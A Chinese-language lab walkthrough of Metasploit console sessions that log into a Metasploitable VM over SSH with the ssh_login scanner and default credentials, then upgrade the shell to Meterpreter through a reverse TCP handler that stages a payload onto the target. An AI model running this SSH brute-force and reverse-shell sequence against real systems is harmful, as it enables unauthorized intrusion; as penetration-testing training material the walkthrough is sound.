# msf暴力破解22端口获取meterpreter

All exploits in the Metasploit Framework will fall into two categories: active and passive.

Stages are payload components that are downloaded by Stagers modules. The various payload stages provide advanced features with no size limits such as Meterpreter, VNC Injection, and the iPhone ‘ipwn’ Shell.

Meterpreter is an advanced, dynamically extensible payload (Stages)


## 查看当前已建立的会话

```
msf6 payload(linux/x86/shell_reverse_tcp) > sessions             
                                                                 
Active sessions                                                  
===============                                                  
                                                                 
No active sessions.                                              
                                                                 
```

## 查找ssh_login相关的模块

```
msf6 payload(linux/x86/shell_reverse_tcp) > search ssh_login
                                                                 
Matching Modules                                                 
================                                                 
                                                                 
   #  Name                                    Disclosure Date  Rank    Check  Description                 
   -  ----                                    ---------------  ----    -----  -----------                 
   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner     
   1  auxiliary/scanner/ssh/ssh_login_pubkey  .                normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
```

## 查看`auxiliary/scanner/ssh/ssh_logi`模块支持参数

```
msf6 payload(linux/x86/shell_reverse_tcp) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```

## ## 设置`auxiliary/scanner/ssh/ssh_logi`模块必要参数

```
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.13.132
rhosts => 192.168.13.132
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.13.132:22 - Starting bruteforce
[*] Error: 192.168.13.132: Metasploit::Framework::LoginScanner::Invalid Cred details can't be blank, Cred details can't be blank (Metasploit::Framework::LoginScanner::SSH)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 查看`auxiliary/scanner/ssh/ssh_logi`模块已经设置参数

```
msf6 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            192.168.13.132   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```

## 设置`auxiliary/scanner/ssh/ssh_logi`模块其它必要参数

```
msf6 auxiliary(scanner/ssh/ssh_login) > set username msfadmin
username => msfadmin
msf6 auxiliary(scanner/ssh/ssh_login) > set password msfadmin
password => msfadmin
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.13.132:22 - Starting bruteforce
[+] 192.168.13.132:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 1 opened (192.168.13.131:42669 -> 192.168.13.132:22) at 2024-07-18 23:19:00 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 查看当前已建立的会话

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   192.168.13.131:42669 -> 192.168.13.132:22 (192.168.13.132)
```

## 将shell会话换成meterpreter

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.13.131:4433 
[*] Sending stage (1017704 bytes) to 192.168.13.132
[*] 192.168.13.132 - Meterpreter session 2 closed.  Reason: Died
[-] Meterpreter session 2 is not valid and will be closed
[*] Command stager progress: 100.00% (773/773 bytes)
```

### 查看当前已建立的会话

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   192.168.13.131:42669 -> 192.168.13.132:22 (192.168.13.132)
```

### 再次尝试将shell会话换成meterpreter

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.13.131:4433 
[*] Sending stage (1017704 bytes) to 192.168.13.132
[*] Meterpreter session 3 opened (192.168.13.131:4433 -> 192.168.13.132:59859) at 2024-07-18 23:30:06 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
```

### 查看当前已建立的会话

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information                            Connection
  --  ----  ----                   -----------                            ----------
  1         shell linux            SSH kali @                             192.168.13.131:42669 -> 192.168.13.132:22 (192.168.13.132)
  3         meterpreter x86/linux  msfadmin @ metasploitable.localdomain  192.168.13.131:4433 -> 192.168.13.132:59859 (192.168.13.132)
```

### 连接指定Session id的会话

```
msf6 > sessions -i 1
[*] Starting interaction with 1...

ls
vulnerable
pwd
/home/msfadmin
whoami
msfadmin
backgroudn
-bash: line 15: backgroudn: command not found
background

Background session 1? [y/N]  y
```

```
msf6 > sessions -i 3
[*] Starting interaction with 3...

meterpreter > 
meterpreter > ls
Listing: /home/msfadmin
=======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2010-03-16 19:01:07 -0400  .bash_history
040755/rwxr-xr-x  4096  dir   2010-04-17 14:11:00 -0400  .distcc
040700/rwx------  4096  dir   2024-07-18 06:25:01 -0400  .gconf
040700/rwx------  4096  dir   2024-07-18 06:25:31 -0400  .gconfd
100600/rw-------  4174  fil   2012-05-14 02:01:49 -0400  .mysql_history
100644/rw-r--r--  586   fil   2010-03-16 19:12:59 -0400  .profile
100700/rwx------  4     fil   2012-05-20 14:22:32 -0400  .rhosts
040700/rwx------  4096  dir   2010-05-17 21:43:18 -0400  .ssh
100644/rw-r--r--  0     fil   2010-05-07 14:38:35 -0400  .sudo_as_admin_successful
040755/rwxr-xr-x  4096  dir   2010-04-27 23:44:17 -0400  vulnerable

meterpreter > pwd
/home/msfadmin
meterpreter > 
```
